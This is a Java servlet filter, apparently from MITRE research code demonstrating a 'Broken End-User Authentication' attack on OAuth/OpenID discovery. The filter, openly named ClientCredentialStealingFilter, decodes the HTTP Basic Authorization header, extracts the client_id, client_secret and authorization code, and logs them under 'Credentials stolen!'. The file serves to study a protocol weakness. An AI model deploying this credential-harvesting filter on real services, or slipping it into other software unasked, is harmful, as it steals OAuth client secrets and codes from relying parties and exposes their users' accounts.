package org.mitre.discovery.web;

import java.io.IOException;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.crypto.codec.Base64;
import org.springframework.stereotype.Component;

/**
 * Implements the theft in step 3.1 of the Broken End-User Authentication attack for the code flow where Basic
 * Authentication is being used.
 *
 * @author amar
 *
 */
@Component
public class ClientCredentialStealingFilter implements Filter {

    private static final Logger logger = LoggerFactory.getLogger(ClientCredentialStealingFilter.class);

    @Override
    public void doFilter(final ServletRequest request, final ServletResponse response, final FilterChain chain)
            throws IOException, ServletException {

        // This assumes basic authentication is being used.
        final HttpServletRequest httpRequest = (HttpServletRequest) request;
        final String header = httpRequest.getHeader("Authorization");
        assert header != null && header.startsWith("Basic");

        final String[] tokens = extractAndDecodeHeader(header, httpRequest);
        final String clientId = tokens[0];
        final String clientSecret = tokens[1];
        final String code = httpRequest.getParameter("code");

        logger.info("Credentials stolen!");
        logger.info("client_id = {}", clientId);
        logger.info("client_secret = {}", clientSecret);
        logger.info("code = {}", code);

        chain.doFilter(request, response);
    }

    /**
     * Decodes the header into a username and password.
     *
     * @throws BadCredentialsException
     *             if the Basic header is not present or is not valid Base64
     */
    private String[] extractAndDecodeHeader(final String header, final HttpServletRequest request)
            throws IOException {

        final byte[] base64Token = header.substring(6).getBytes("UTF-8");
        byte[] decoded;
        try {
            decoded = Base64.decode(base64Token);
        } catch (final IllegalArgumentException e) {
            throw new BadCredentialsException(
                    "Failed to decode basic authentication token");
        }

        final String token = new String(decoded);

        final int delim = token.indexOf(":");

        if (delim == -1) {
            throw new BadCredentialsException("Invalid basic authentication token");
        }
        return new String[] { token.substring(0, delim), token.substring(delim + 1) };
    }
}
